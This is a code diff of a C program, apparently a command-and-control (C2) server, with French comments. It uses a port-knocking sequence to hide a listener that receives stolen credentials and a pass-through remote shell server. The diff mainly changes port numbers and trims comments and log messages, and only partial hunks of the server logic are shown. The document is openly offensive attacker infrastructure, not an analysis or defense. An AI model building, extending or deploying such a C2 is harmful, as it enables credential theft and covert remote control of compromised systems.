@@ -8,24 +8,24 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 
-#define KNOCK_PORT1 5001
-#define KNOCK_PORT2 5002
-#define KNOCK_PORT3 5003
+#define KNOCK_PORT1 5432
+#define KNOCK_PORT2 5543
+#define KNOCK_PORT3 5554
 
-#define CREDS_PORT  4444   // Pour recevoir les credentials
-#define SHELL_PORT  4445   // Pour le mini-serveur "shell"
+#define CREDS_PORT  5555
+#define SHELL_PORT  6666
 
 #define BUFFER_SIZE 4096
 
-// Variables pour le knocking
+// Variables pour le knocking et ouvre les port un fois la séquence validée
 static int knockStep = 0;
 static char expectedIP[INET_ADDRSTRLEN] = {0};
 pthread_mutex_t knock_lock = PTHREAD_MUTEX_INITIALIZER;
-static int ports_opened = 0; // Permet d'ouvrir les ports 4444/4445 une fois la séquence validée
+static int ports_opened = 0; 
 
-// ---------------------------------------------------------------------
-// knock_listener : écoute sur un port et gère la séquence de port knocking
-// ---------------------------------------------------------------------
+
+// écoute sur un port et gère la séquence de port knocking
+
 void *knock_listener(void *arg) {
     int port = *(int*)arg;
     free(arg);
@@ -56,7 +56,7 @@ void *knock_listener(void *arg) {
         pthread_exit(NULL);
     }
 
-    printf("[Knock Listener] Listening on port %d...\n", port);
+    printf("[Knock] Listening on port %d...\n", port);
 
     while(1) {
         int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
@@ -67,7 +67,7 @@ void *knock_listener(void *arg) {
 
         char ip[INET_ADDRSTRLEN];
         inet_ntop(AF_INET, &cli_addr.sin_addr, ip, INET_ADDRSTRLEN);
-        printf("[Knock Listener] Connection from %s on port %d\n", ip, port);
+        printf("[Knock] Connection from %s on port %d\n", ip, port);
 
         pthread_mutex_lock(&knock_lock);
         if(knockStep == 0 && port == KNOCK_PORT1) {
@@ -106,9 +106,8 @@ void *knock_listener(void *arg) {
     pthread_exit(NULL);
 }
 
-// ---------------------------------------------------------------------
-// creds_server : thread pour réceptionner les credentials sur le port 4444
-// ---------------------------------------------------------------------
+//Thread pour réceptionner les credentials sur le port désigné
+
 void *creds_server(void *arg) {
     (void)arg;
 
@@ -138,12 +137,12 @@ void *creds_server(void *arg) {
         pthread_exit(NULL);
     }
 
-    printf("[Credentials] Thread ready on port %d (waiting for knocks to open)...\n", CREDS_PORT);
+    printf("[Credentials] Thread ready on port %d \n", CREDS_PORT);
 
     while(!ports_opened) {
         sleep(1);
     }
-    printf("[Credentials] Ports opened => accepting on %d...\n", CREDS_PORT);
+    printf("[Credentials] Ports opened,  accepting on %d...\n", CREDS_PORT);
 
     while(1) {
         int client_fd = accept(server_fd, (struct sockaddr*)&cli_addr, &cli_len);
@@ -183,9 +182,8 @@ void *creds_server(void *arg) {
     pthread_exit(NULL);
 }
 
-// ---------------------------------------------------------------------
-// shell_server : thread pour le mini-serveur "shell" sur le port 4445
-// ---------------------------------------------------------------------
+// Thread pour le mini-serveur "shell" sur le port désigné
+
 void *shell_server(void *arg) {
     (void)arg;
 
@@ -214,12 +212,12 @@ void *shell_server(void *arg) {
         pthread_exit(NULL);
     }
 
-    printf("[Shell] Thread ready on port %d (waiting for knocks)...\n", SHELL_PORT);
+    printf("[Shell] Thread ready on port %d \n", SHELL_PORT);
 
     while (!ports_opened) {
         sleep(1);
     }
-    printf("[Shell] Ports opened => accepting on %d (pass-through shell)...\n", SHELL_PORT);
+    printf("[Shell] Ports opened, accepting on %d \n", SHELL_PORT);
 
     while (1) {
         struct sockaddr_in cli_addr;
@@ -283,11 +281,10 @@ void *shell_server(void *arg) {
     pthread_exit(NULL);
 }
 
-// ---------------------------------------------------------------------
-// main : lancement des threads
-// ---------------------------------------------------------------------
+// Lancement des threads
+
 int main() {
-    printf("[Main] Lancement du C2 unifié.\n");
+    printf("[Main] Lancement du C2 .\n");
 
     pthread_t tkn1, tkn2, tkn3;
     int *p1 = malloc(sizeof(int)); *p1 = KNOCK_PORT1;
@@ -303,9 +300,7 @@ int main() {
     pthread_t tshell;
     pthread_create(&tshell, NULL, shell_server, NULL);
 
-    // Partie API supprimée
 
-    // Boucle infinie pour maintenir le programme en exécution
     while (1) {
         sleep(999999);
     }
